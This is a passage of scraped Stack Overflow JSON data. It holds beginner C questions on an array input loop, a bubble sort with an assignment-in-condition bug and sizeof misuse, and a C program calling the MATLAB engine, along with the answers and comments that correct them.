array, why does it always skip the while loop?</p>\n</blockquote>\n<p>Well, that depends on what you try to check.  The first thing on this is that you are say in the code is <em>compare the last input number with the earlier ones, and if it is greater than or equal than any of them, then input the third number again</em>.  That's correct if that is what you want, but I cannot guess also what is the purpose of doing such a test, so the only thing I can conclude is that the test is not well written (and mainly because of what I'm going to say next).</p>\n<p>The third comment about your program is:</p>\n<p>If you need to check the last value against the previous ones, why don't do that outside of the loop.  Doing so not only allows your code to look simpler, but also eliminates the need of the <code>if (i == 2)</code> test (you don't need to use <code>i</code> at all in your code, just write:</p>\n<pre><code>    for(i=0; i &lt; 3; i++) {\n        scanf(&quot;%d&quot;,&amp;sides[i]); /* you don't need the space before %d */\n    }\n    while((sides[2] &lt; sides[1]) &amp;&amp; (sides[2] &lt; sides[0])) {\n        scanf(&quot;%d&quot;,&amp;sides[2]);\n    }\n</code></pre>\n<p>Last, you say in a comment that changing <code>int *sides[3]</code> to just <code>int sides[3]</code> makes compilation fail.  I've tried and just eliminating that <code>*</code> just eliminates three warnings I get from your code compilation.  Cannot guess why do you say it doesn't compile with that elimination.</p>\n<h1>NOTE</h1>\n<p>Your code seems to try to check if the three sides of a triangle allow you to build one.  If that's is true, the correct test is for the third triangle to be <em>greater than the difference of the previous sides <strong>and</strong> less than the sum of the previous sides</em>, and this is not what you have written above.  A valid test should be:</p>\n<pre><code>#define ABS(expr) ((expr) &lt; 0 ? -(expr) : (expr))\n\nwhile (sides[2] &gt;= sides[1] + sides[0] || sides[2] &lt;= ABS(sides[1] - sides[0])) {\n    scanf(&quot;%d&quot;, &amp;sides[2]);\n}\n</code></pre>\n"}], "owner": {"reputation": 506, "user_id": 6655405, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/oqJAE.png?s=128&g=1", "display_name": "Stelios Papamichail", "link": "https://stackoverflow.com/users/6655405/stelios-papamichail"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 0, "accepted_answer_id": 53300467, "answer_count": 3, "score": 2, "last_activity_date": 1542705472, "creation_date": 1542199066, "last_edit_date": 1542200472, "question_id": 53300417, "link": "https://stackoverflow.com/questions/53300417/bool-expression-seems-logical-but-doesnt-work", "title": "bool expression seems logical but doesn&#39;t work", "body": "<p>I'm reading 3 integers in my C program and storing them in an <code>int *[]</code>. While reading the 3rd <code>int</code> however, I want to compare it to the previous 2 and if it's greater than both of them the program ends, if it isn't the program will keep on reading the 3rd. input until it satisfies the condition in the <code>while</code> loop. </p>\n\n<p>My issue is, although the bool expression seems logical (to me at least) and the values I enter are successfully stored in the array, why does it always skip the <code>while</code> loop?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) { // Stelios Papamichail 4020\n    int *sides[3];\n    int i;\n    for(i=0; i &lt; 3; i++) {\n        if(i == 2) {// third side\n            scanf(\" %d\",&amp;sides[i]);\n            while((sides[i] &lt; sides[i-1]) &amp;&amp; (sides[i] &lt; sides[i-2])) {\n                scanf(\" %d\",&amp;sides[i]);\n            }\n        } else {\n            scanf(\" %d\",&amp;sides[i]);\n        }\n    }\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "loops", "for-loop", "scanf"], "comments": [{"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 2, "creation_date": 1542197664, "post_id": 53299943, "comment_id": 93480510, "body": "<code>sizeof(array)</code> won&#39;t do what you think it does. Look up &quot;array to pointer decay&quot;."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1542197692, "post_id": 53299943, "comment_id": 93480529, "body": "In the <code>printf</code> call after the reading loop, try adding a trailing newline. Also please <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">learn how to debug your code</a>. Especially learn how to use a debugger to step through your code line by line. The problem is not where you think it is, the output of that <code>printf</code> call is just not written to the terminal."}, {"owner": {"reputation": 6951, "user_id": 3475381, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/b6a1c5d19f4ae8c6a1dbf097487c96d7?s=128&d=identicon&r=PG&f=1", "display_name": "Gaurav Sehgal", "link": "https://stackoverflow.com/users/3475381/gaurav-sehgal"}, "edited": false, "score": 4, "creation_date": 1542197718, "post_id": 53299943, "comment_id": 93480544, "body": "Also <code>while (finish = 1)</code>--&gt;<code>while (finish == 1)</code>"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1542197733, "post_id": 53299943, "comment_id": 93480555, "body": "Also, <code>(array + i) &gt; (array + i + 1)</code> will not do what you expect either. That condition will <i>always</i> be false. Don&#39;t use pointer arithmetic for &quot;arrays&quot;, always use array indexing."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 2, "creation_date": 1542197760, "post_id": 53299943, "comment_id": 93480571, "body": "@Swordfish I thought <code>int array[s];</code> should be an array....right?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1542197799, "post_id": 53299943, "comment_id": 93480599, "body": "@SouravGhosh Yes, but in the <code>sort</code> function <code>array</code> is not an array."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1542197842, "post_id": 53299943, "comment_id": 93480619, "body": "@Someprogrammerdude Ah...TL;DR..i was looking in <code>main()</code>.. :)"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1542197888, "post_id": 53299943, "comment_id": 93480641, "body": "Please always enable warnings in your compiler. The line <code>while (finish = 1)</code> should cause some warning about an assignment in a condition."}, {"owner": {"reputation": 33, "user_id": 9403640, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Dpo48XHktf8/AAAAAAAAAAI/AAAAAAAAAQo/fiNYGiaxaSY/photo.jpg?sz=128", "display_name": "Mavil", "link": "https://stackoverflow.com/users/9403640/mavil"}, "edited": false, "score": 0, "creation_date": 1542198213, "post_id": 53299943, "comment_id": 93480849, "body": "wow guys.. I&#39;m really sorry for this super stupid question. Thank you for pointing out the finish = 1 I&#39;m sorry for wasting your time. The program executed fully without the expected results but I&#39;ll work on that there are definitely other mistakes I can sort out. I&#39;ll work on this. I&#39;ll also stick to using array indexing for this program. Thank you so much and I&#39;m sincerely sorry for wasting your time. I learned a lot thank you guys!"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 1, "creation_date": 1542198290, "post_id": 53299943, "comment_id": 93480888, "body": "<code>sizeof(array)</code> is misused both times.  In the <code>sort()</code> function, <code>sizeof(array)</code> returns the number of bytes that make up the <b>pointer</b> <code>int *array</code>.  In <code>main</code>, <code>sizeof(array)</code> returns the number of <b>bytes</b> in the array <code>int array[s];</code> and not the number of elements in the array."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 0, "creation_date": 1542198066, "post_id": 53300129, "comment_id": 93480757, "body": "&quot;returns the same as sizeof(int)&quot; nope."}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 0, "creation_date": 1542198088, "post_id": 53300129, "comment_id": 93480772, "body": "&quot;<code>printf(&quot;%s&quot;, sizeof(array))</code>&quot; nope, nope."}, {"owner": {"reputation": 9, "user_id": 10622346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dce2c1e332b80454c7b7b4222ba404ad?s=128&d=identicon&r=PG&f=1", "display_name": "rytec", "link": "https://stackoverflow.com/users/10622346/rytec"}, "reply_to_user": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 0, "creation_date": 1542198434, "post_id": 53300129, "comment_id": 93480988, "body": "Does the sizeof not return the size of the pointer type? That was always my understanding of it."}, {"owner": {"reputation": 9, "user_id": 10622346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dce2c1e332b80454c7b7b4222ba404ad?s=128&d=identicon&r=PG&f=1", "display_name": "rytec", "link": "https://stackoverflow.com/users/10622346/rytec"}, "reply_to_user": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 0, "creation_date": 1542198657, "post_id": 53300129, "comment_id": 93481132, "body": "Ok, I should have tested it myself before answering, it returns the size of the pointer type."}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 1, "creation_date": 1542200738, "post_id": 53300129, "comment_id": 93482313, "body": "Should be using <code>%zu</code> not <code>%d</code> for printing out the <code>sizeof</code> something"}], "tags": [], "owner": {"reputation": 9, "user_id": 10622346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dce2c1e332b80454c7b7b4222ba404ad?s=128&d=identicon&r=PG&f=1", "display_name": "rytec", "link": "https://stackoverflow.com/users/10622346/rytec"}, "is_accepted": false, "score": -1, "last_activity_date": 1542198828, "last_edit_date": 1542198828, "creation_date": 1542198026, "answer_id": 53300129, "question_id": 53299943, "link": "https://stackoverflow.com/questions/53299943/stuck-in-a-for-loop-entering-values-to-an-array-in-c-language/53300129#53300129", "title": "Stuck in a for loop entering values to an array in C language", "body": "<p>In the sort function <code>sizeof(array)</code> returns the size of the pointer. (you can check it by yourself using <code>printf(\"%d\", sizeof(array)</code>.</p>\n\n<p>The solution is to change your function to:</p>\n\n<pre><code>int sort(int* array, size_t size) { ... }\n</code></pre>\n\n<p>and call it with the correct array size:</p>\n\n<pre><code>sort(array, s);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 33, "user_id": 9403640, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Dpo48XHktf8/AAAAAAAAAAI/AAAAAAAAAQo/fiNYGiaxaSY/photo.jpg?sz=128", "display_name": "Mavil", "link": "https://stackoverflow.com/users/9403640/mavil"}, "edited": false, "score": 0, "creation_date": 1542199817, "post_id": 53300378, "comment_id": 93481780, "body": "You cannot imagine how helpful this is thank you so much!! I learned a lot from this and you expanded my understanding of C thank you!"}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "reply_to_user": {"reputation": 33, "user_id": 9403640, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Dpo48XHktf8/AAAAAAAAAAI/AAAAAAAAAQo/fiNYGiaxaSY/photo.jpg?sz=128", "display_name": "Mavil", "link": "https://stackoverflow.com/users/9403640/mavil"}, "edited": false, "score": 0, "creation_date": 1542200074, "post_id": 53300378, "comment_id": 93481931, "body": "&quot;You cannot imagine how helpful&quot; Yes, i can. i learned C++ the very hard way without internet access and q+a sites or forums using Borland C++ 3.1 on DOS 6.22^^"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542205464, "post_id": 53300378, "comment_id": 93485462, "body": "<code>i +1 &lt; size</code> handles the corner  case of <code>size == 0</code>. It is better than <code>i &lt; size - 1</code> which will iterate for a long time as it is effectively <code>i &lt; SIZE_MAX</code>."}], "tags": [], "owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "is_accepted": true, "score": 3, "last_activity_date": 1542199188, "last_edit_date": 1542199188, "creation_date": 1542198860, "answer_id": 53300378, "question_id": 53299943, "link": "https://stackoverflow.com/questions/53299943/stuck-in-a-for-loop-entering-values-to-an-array-in-c-language/53300378#53300378", "title": "Stuck in a for loop entering values to an array in C language", "body": "<p>See the annotations in the code:</p>\n\n<pre><code>#include &lt;stddef.h&gt;  // size_t  1)\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid swap(int *x, int *y)\n{\n    int temp = *x;\n    *x = *y;\n    *y = temp;\n}\n\nint *sort(int *array, size_t size)  // needs an extra parameter to know the size of the array\n{\n    int finish = 1;\n    while (finish /* = 1 * you don't want assignment, you want comparison: */ == 1)\n    {\n        finish = 0;\n        for (int i = 0; i /* &lt;= sizeof(array) */ &lt; size - 1; i++)  // i should be of type size_t\n        {\n            // if ((array + i) &gt; (array + i + 1)) you are not dereferencing:\n            if(array[i] &gt; array[i + 1]) \n            {\n                // swap(array + i, array + i + 1);  // easier to read imho:\n                swap(&amp;array[i], &amp;array[i + 1]);\n                finish = 1;\n            }\n        }\n    }\n    return array;  // why does this function return anything? it is never used.\n}\nint main()\n{\n    int s; /* , res;  no need for an extra variable res */\n    printf(\"Give me the size of the array being sorted(larger than 1) : \");\n    do\n    {\n        // res = scanf(\"%d\", &amp;s);\n        // if (res != 1)\n        if (scanf(\"%d\", &amp;s) != 1)\n        {\n            printf(\"Wrong Input!\\n\");\n            // exit(1);  // should be EXIT_FAILURE. Use return instead of exit() when in main().\n            return EXIT_FAILURE;\n        }\n        if (s &lt; 2)\n            printf(\"Only numbers equal or larger than 2\\n\");\n\n    } while (s &lt; 2);\n    int array[s];\n    for (int i = 0; i &lt; s; /* i += 1* idiomatic: */ ++i)  // size_t would be the correct type for s and i.\n    {\n        scanf(\"%d\", /* array + i  use indexes: */ &amp;array[i]);\n        printf(\"%d %d %d\\n\\n\", array[i], i, i &lt; s);  // again: indexes. i &lt; s is allready ensured by the condition of the for-loop\n    }\n    printf(\"end of reading the array\");\n    // sort(array);  // sort will have no idea about the size of array use\n    sort(array, s); // instead.\n\n    printf(\"\\n\");\n    for (int i = 0; i &lt; /* sizeof(array) 2) */ s; i++)\n        printf(\"%d\\n\\n\", /* array + i * again you don't dereference */ array[i]);\n    printf(\"Array has been sorted! Have a nice day!\\n\\n************************************************************\");\n    return 0;\n}\n</code></pre>\n\n<p>1) <code>size_t</code> is the type that is guaranteed to be big enough to hold all sizes of objects in memory and indexes into them. The conversion specifier for <code>scanf()</code> is <code>\"%zu\"</code>.</p>\n\n<p>2) <code>sizeof(array)</code> in <code>main()</code> will yield the number of bytes in <code>array</code>, but you want the number of elements so you'd have to use <code>sizeof(array) / sizeof(*array)</code>. But thats not needed since you already know its size. It is <code>s</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 80047, "user_id": 169346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645dbb4f7ba1ff9d7ff2de02f68fbe9c?s=128&d=identicon&r=PG", "display_name": "JeremyP", "link": "https://stackoverflow.com/users/169346/jeremyp"}, "is_accepted": false, "score": 0, "last_activity_date": 1542199799, "creation_date": 1542199799, "answer_id": 53300663, "question_id": 53299943, "link": "https://stackoverflow.com/questions/53299943/stuck-in-a-for-loop-entering-values-to-an-array-in-c-language/53300663#53300663", "title": "Stuck in a for loop entering values to an array in C language", "body": "<p>This line</p>\n\n<pre><code>printf(\"end of reading the array\");\n</code></pre>\n\n<p>has no line feed at the end of the string. This is a problem because <code>printf</code> is part of the family of functions called \"buffered IO\". The C library maintains a buffer of the things you want to print and only sends them to the terminal if the buffer gets full or it encounters <code>\\n</code> in the stream of characters. You will not see, <code>end of reading the array</code> on your screen until after you have printed a line feed. You only do this <em>after</em> calling <code>sort()</code>. So all you know is your program is getting into an infinite loop at some point before the end of <code>sort</code>.</p>\n\n<p>So there are actually three loops that could be infinite: the <code>for</code> loop you identified, the <code>while</code> loop in <code>sort</code> and the <code>for</code> loop inside the <code>while</code> loop. As the other answers point out, you have made the classic mistake of using assignment in the <code>while</code> conditional </p>\n\n<pre><code>while (finish = 1)\n//            ^ not enough equals signs\n</code></pre>\n\n<p>Unless your C compiler is really old, it is probably outputting a warning on that line. You should heed warnings.</p>\n\n<p>Also, you should learn to use a debugger sooner rather than later. Believe me, it will save you a lot of time finding bugs.</p>\n"}], "owner": {"reputation": 33, "user_id": 9403640, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Dpo48XHktf8/AAAAAAAAAAI/AAAAAAAAAQo/fiNYGiaxaSY/photo.jpg?sz=128", "display_name": "Mavil", "link": "https://stackoverflow.com/users/9403640/mavil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 261, "favorite_count": 0, "accepted_answer_id": 53300378, "answer_count": 3, "score": 2, "last_activity_date": 1542199799, "creation_date": 1542197458, "last_edit_date": 1542197556, "question_id": 53299943, "link": "https://stackoverflow.com/questions/53299943/stuck-in-a-for-loop-entering-values-to-an-array-in-c-language", "title": "Stuck in a for loop entering values to an array in C language", "body": "<p>I am trying to practice with C by making a bubble sort program. The problem until now seems to be that the for loop that is giving values to the cells of the array is stuck after the condition is no longer fulfilled but it doesn't seem to be executing the commands in the loop. I don't know what is happening exactly and I have added some extra lines to see what is happening an these were my conclusions. Here is the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid swap(int *x, int *y)\n{\n    int temp = *x;\n    *x = *y;\n    *y = temp;\n}\n\nint *sort(int *array)\n{\n    int finish = 1;\n    while (finish = 1)\n    {\n        finish = 0;\n        for (int i = 0; i &lt;= sizeof(array); i++)\n        {\n            if ((array + i) &gt; (array + i + 1))\n            {\n                swap(array + i, array + i + 1);\n                finish = 1;\n            }\n        }\n    }\n    return array;\n}\nint main()\n{\n    int s, res;\n    printf(\"Give me the size of the array being sorted(larger than 1) : \");\n    do\n    {\n        res = scanf(\"%d\", &amp;s);\n        if (res != 1)\n        {\n            printf(\"Wrong Input!\\n\");\n            exit(1);\n        }\n        if (s &lt; 2)\n            printf(\"Only numbers equal or larger than 2\\n\");\n\n    } while (s &lt; 2);\n    int array[s];\n    for (int i = 0; i &lt; s; i += 1)\n    {\n        scanf(\"%d\", array + i);\n        printf(\"%d %d %d\\n\\n\", *(array + i), i, i &lt; s); // I used this to check if my values were ok\n    }\n    printf(\"end of reading the array\"); //I added this line to see if I would exit the for loop. I am not seeing this message\n    sort(array);\n    printf(\"\\n\");\n    for (int i = 0; i &lt; sizeof(array); i++)\n        printf(\"%d\\n\\n\", array + i);\n    printf(\"Array has been sorted! Have a nice day!\\n\\n************************************************************\");\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "matlab", "segmentation-fault"], "comments": [{"owner": {"reputation": 1480, "user_id": 10450594, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae4c6a0ca94b3094b25f18e66d8368ff?s=128&d=identicon&r=PG&f=1", "display_name": "Brice", "link": "https://stackoverflow.com/users/10450594/brice"}, "edited": false, "score": 0, "creation_date": 1542200640, "post_id": 53299284, "comment_id": 93482259, "body": "The question title says that the issue is about creating empty arrays. Have you done any tests that narrows it down to that problem or is it a guess? also, there is a typo <code>memcpy(XC, mxGetData(xC),mRowsProcess*sizeof(double));</code> that should be <code>memcpy(XPROCESS, mxGetData(xProcess),mRowsProcess*sizeof(double));</code>"}, {"owner": {"reputation": 27, "user_id": 5333418, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/pTVGi.png?s=128&g=1", "display_name": "S. Perez", "link": "https://stackoverflow.com/users/5333418/s-perez"}, "reply_to_user": {"reputation": 1480, "user_id": 10450594, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae4c6a0ca94b3094b25f18e66d8368ff?s=128&d=identicon&r=PG&f=1", "display_name": "Brice", "link": "https://stackoverflow.com/users/10450594/brice"}, "edited": false, "score": 0, "creation_date": 1542208070, "post_id": 53299284, "comment_id": 93487222, "body": "I have done tests in order to get which line of the code causes the segmentation fault in C. And I narrowed it down to the <code>mxGetM(xC)</code> line. When I don&#39;t fill <code>xC</code> in Matlab I don&#39;t get any errors. So my question is more if this is the proper way to fill an empty array in a C code calling a Matlab function."}, {"owner": {"reputation": 1480, "user_id": 10450594, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae4c6a0ca94b3094b25f18e66d8368ff?s=128&d=identicon&r=PG&f=1", "display_name": "Brice", "link": "https://stackoverflow.com/users/10450594/brice"}, "edited": false, "score": 0, "creation_date": 1542209686, "post_id": 53299284, "comment_id": 93488183, "body": "xC is created in C, then passed to the Matlab engine. What gets out of that may be totally unrelated to what gets in (code should still work with separate variables <code>xC_in</code> and <code>xC_out</code>). Actually, you could have a Matlab function that does not take any argument and still returns some variable xC. Have you examined what actually gets in the Matlab function? You could use <code>engEvalString(ep, &quot;save(&#39;dump_input.mat&#39;,&#39;xProcess&#39;,&#39;yProcess&#39;,&#39;xC&#39;,&#39;yC&#39;);&quot;);</code> to check what actually gets into the Matlab function (and another one just after to dump the output). Or do that from within the Matlab function."}, {"owner": {"reputation": 1480, "user_id": 10450594, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae4c6a0ca94b3094b25f18e66d8368ff?s=128&d=identicon&r=PG&f=1", "display_name": "Brice", "link": "https://stackoverflow.com/users/10450594/brice"}, "edited": false, "score": 1, "creation_date": 1542210365, "post_id": 53299284, "comment_id": 93488653, "body": "<code>engGetVariable</code> will return a NULL pointer in case of failure, which would be a cause for the seg fault with <code>mxGetM</code>. You should test that. The variables should exist in Matlab engine workspace regardless of your Matlab function success or failure, though, since they have the same name as the input variables. That is, as long as the calls to <code>engPutVariable</code> succeeded (i.e. returned 0). You should test that too. Replace <code>engPutVariable(ep,&quot;xC&quot;,xC)</code> with <code>if(engPutVariable(ep,&quot;xC&quot;,xC)) {printf(&#39;Error putting xC\\n&#39;);fflush(stdout);}</code>"}, {"owner": {"reputation": 27, "user_id": 5333418, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/pTVGi.png?s=128&g=1", "display_name": "S. Perez", "link": "https://stackoverflow.com/users/5333418/s-perez"}, "reply_to_user": {"reputation": 1480, "user_id": 10450594, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ae4c6a0ca94b3094b25f18e66d8368ff?s=128&d=identicon&r=PG&f=1", "display_name": "Brice", "link": "https://stackoverflow.com/users/10450594/brice"}, "edited": false, "score": 0, "creation_date": 1542213573, "post_id": 53299284, "comment_id": 93490696, "body": "You nailed it! But I still don\u2019t know what is failing. So I saved the input before sending it to Matlab and everything is right. However, saving the output coming from Matlab function saved nothing. Moreover I added a condition if xC is NULL and this condition is met! So clearly what is failing is the line \u2018engEvalString(ep,\u201d[xProcess,yProcess,xC,yC] = my_matlab_function(xProcess,yProcess,xC,yC);\u201d);\u2019. But I don\u2019t get it. How is it possible to fail? If I have an error in my_matlab_function this will appear on screen as an error in Matlab. Any guess?"}, {"owner": {"reputation": 42647, "user_id": 7328782, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/treJu.png?s=128&g=1", "display_name": "Cris Luengo", "link": "https://stackoverflow.com/users/7328782/cris-luengo"}, "edited": false, "score": 0, "creation_date": 1542301650, "post_id": 53299284, "comment_id": 93529580, "body": "@S.Perez: Did you try evaluating an obviously wrong statement, see if you can see the error message? It looks like it is possible to turn off output buffering, meaning you wouldn&#39;t see any error messages."}], "owner": {"reputation": 27, "user_id": 5333418, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/pTVGi.png?s=128&g=1", "display_name": "S. Perez", "link": "https://stackoverflow.com/users/5333418/s-perez"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 67, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1542281801, "creation_date": 1542195281, "last_edit_date": 1542281801, "question_id": 53299284, "link": "https://stackoverflow.com/questions/53299284/c-and-matlab-create-empty-array-in-c-calls-matlab-function-to-fill-it-ends-in-e", "title": "C and MATLAB: Create empty array in C calls Matlab function to fill it ends in error", "body": "<p>This is the problem:</p>\n\n<p>I have a C code that creates an array <code>nRows x 2</code>, called <code>InitialArray</code> filled with random numbers. Then I split that array into two parts, that is the first column is called <code>xProcess</code> and the second column of the array is <code>yProcess</code>. \nThe goal is to pass these variables I created (<code>xProcess</code> and <code>yProcess</code>) to Matlab and there a Matlab function based on probabilities rules will put <code>NaN</code> in some of the elements of <code>xProcess</code> and <code>yProcess</code>, and will fill empty arrays called <code>xC</code> and <code>yC</code> with the values of <code>xProcess</code> and <code>yProcess</code> before turning to <code>NaN</code>. \nFinally, the C code gets all four arrays back again, perform some operations on them and send them again to Matlab. This process is repeated for a number of time steps.</p>\n\n<p>Here is a piece of the code:</p>\n\n<pre><code>int main ( void ){\n\nEngine *ep;\nif (!(ep = engOpen(\"\"))) {\n\n    fprintf(stderr, \"\\nCan't start MATLAB engine\\n\");\n    return EXIT_FAILURE;\n}\n\nmxArray *xProcess = NULL;\nmxArray *yProcess = NULL;    \nmxArray *xC = NULL;\nmxArray *yC = NULL;\n\nint timeStep;\nint numberProcess = 4e6;\nint numberC = 0;\n</code></pre>\n\n<p>So far I created the mxArray, and the number of random numbers that will be stored in <code>xProcess</code> and <code>yProcess</code>. Now comes the loop.</p>\n\n<pre><code>for (timeStep=0 ; timeStep&lt;numberTimeSteps ; timeStep++){\n\ndouble *arrayTempxProcess;\narrayTempxProcess = (double *)calloc(numberProcess, sizeof(double)); \ndouble *arrayTempyProcess;\narrayTempyProcess = (double *)calloc(numberProcess, sizeof(double));   \n\ndouble *arrayTempxC;\narrayTempxC=(double *)calloc(numberC, sizeof(double)); \ndouble *arrayTempyC;\narrayTempyC=(double *)calloc(numberC, sizeof(double)); \n\nxProcess = mxCreateDoubleMatrix(numberProcess, 1, mxREAL); \nyProcess = mxCreateDoubleMatrix(numberProcess, 1, mxREAL);\n\nxC = mxCreateDoubleMatrix(numberC, 1, mxREAL); \nyC = mxCreateDoubleMatrix(numberC, 1, mxREAL);\n\nmemcpy((void *)mxGetPr(yProcess), (void *)arrayTempyProcess, numberProcess*sizeof(double));\nmemcpy((void *)mxGetPr(xProcess), (void *)arrayTempxProcess, numberProcess*sizeof(double));\n</code></pre>\n\n<p>As you see <code>xC</code> and <code>yC</code> I create them as empty. I believe this is equivalent to <code>xC = []</code> and <code>yC = []</code> in Matlab. And the <code>arrayTempyProcess</code> and <code>arrayTempxProcess</code> are temporal arrays that each of them gets a column of <code>InitialArray</code>. </p>\n\n<pre><code>if(timeStep&gt;0){\nmemcpy((void *)mxGetPr(yC), (void *)arrayTempyC,(numberC)*sizeof(double));\nmemcpy((void *)mxGetPr(xC), (void *)arrayTempxC, (numberC)*sizeof(double)); 